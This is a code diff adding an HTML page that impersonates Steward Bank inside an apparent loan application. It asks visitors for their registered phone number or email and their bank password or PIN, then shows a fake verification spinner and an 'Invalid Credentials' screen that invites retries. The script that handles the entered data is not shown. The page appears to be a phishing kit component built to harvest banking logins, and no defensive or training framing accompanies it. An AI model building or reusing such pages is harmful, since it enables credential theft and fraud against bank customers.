@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification - Steward Bank</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body class="app-page">
+    <div class="app-container">
+        <!-- Header -->
+        <div class="app-header">
+            <div class="logo-small">🏦 Steward Bank</div>
+            <div class="security-indicator">
+                <span class="lock-icon">🔒</span>
+                <span>Account Verification</span>
+            </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-wrapper">
+            <div class="progress-steps">
+                <div class="step-item completed">
+                    <div class="step-circle">✓</div>
+                    <span>Personal Details</span>
+                </div>
+                <div class="step-line active"></div>
+                <div class="step-item active">
+                    <div class="step-circle">2</div>
+                    <span>Verification</span>
+                </div>
+                <div class="step-line"></div>
+                <div class="step-item">
+                    <div class="step-circle">3</div>
+                    <span>Approval</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Account Verification Screen -->
+        <div id="verificationScreen" class="form-card">
+            <h1 class="form-title">Verify Your Steward Bank Account</h1>
+            <p class="form-subtitle">Please login with your Steward Bank account credentials</p>
+
+            <div class="form-group">
+                <label>Phone Number or Email *</label>
+                <input type="text" id="accountIdentifier" required placeholder="0771234567 or email@example.com" class="large-input">
+                <small class="help-text">Enter your registered phone number or email address</small>
+            </div>
+
+            <div class="form-group">
+                <label>Password or PIN *</label>
+                <input type="password" id="accountPassword" required placeholder="Enter your password or PIN" class="large-input pin-input">
+                <small class="help-text">Enter your Steward Bank account password or PIN</small>
+            </div>
+
+            <button id="verifyBtn" class="submit-button">
+                Verify and Continue
+                <span class="arrow">→</span>
+            </button>
+
+            <div class="info-box">
+                <p><strong>Why do we need this?</strong></p>
+                <p>We verify that you have an active Steward Bank account to ensure the security of your loan application and to prevent unauthorized use.</p>
+            </div>
+        </div>
+
+        <!-- Processing Screen -->
+        <div id="processingScreen" class="form-card" style="display: none;">
+            <div class="processing-content">
+                <div class="spinner-large"></div>
+                <h2 class="processing-title">Verifying Your Account</h2>
+                <p class="processing-text">Please wait while we verify your credentials with Steward Bank...</p>
+                
+                <div class="status-box">
+                    <span class="status-dot"></span>
+                    <span>Checking account credentials...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Rejection Screen -->
+        <div id="rejectionScreen" class="form-card" style="display: none;">
+            <div class="result-content">
+                <div class="result-icon error">✕</div>
+                <h2 class="result-title">Invalid Credentials</h2>
+                <p class="result-text">Sorry, the account information you provided was not accepted. Please check your credentials and try again.</p>
+                <button class="submit-button" onclick="location.reload()">
+                    Try Again
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="verification-script.js"></script>
+</body>
+</html>
